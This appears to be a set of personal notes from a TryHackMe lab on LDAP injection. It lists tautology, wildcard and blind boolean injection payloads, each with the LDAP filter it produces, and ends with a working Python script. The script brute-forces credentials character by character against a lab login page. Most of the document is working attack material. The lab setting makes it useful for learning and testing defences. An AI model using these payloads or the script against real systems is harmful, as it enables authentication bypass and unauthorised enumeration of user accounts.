ldap search
```
ldapsearch -x -H ldap://MACHINE_IP:389 -b "dc=ldap,dc=thm" "(ou=People)"
```

- Tautology injection
```sh
# given ldap filter: (&(uid={userInput})(userPassword={passwordInput}))
# we can set 
userInput='*)(|(&'
passwordInput='anything)'

# Final filter becomes:
# (&(uid=*)(|(&)(userPassword=pwd)))

```
- Wildcard injection
```sh
# given ldap filter: (&(uid={userInput})(userPassword={passwordInput}))
# we can set 
userInput='f*' # to search for user starting with f
passwordInput='*'

# Final filter becomes:
# (&(uid=f*)(userPassword=*)))

```

- Blind injection: boolean-based injection attack. Eg.
```
username=a*)(|(&&password=pwd)
```

Eg. python script to exploit THM blind LDAP injection challenge:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://10.10.1.112/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```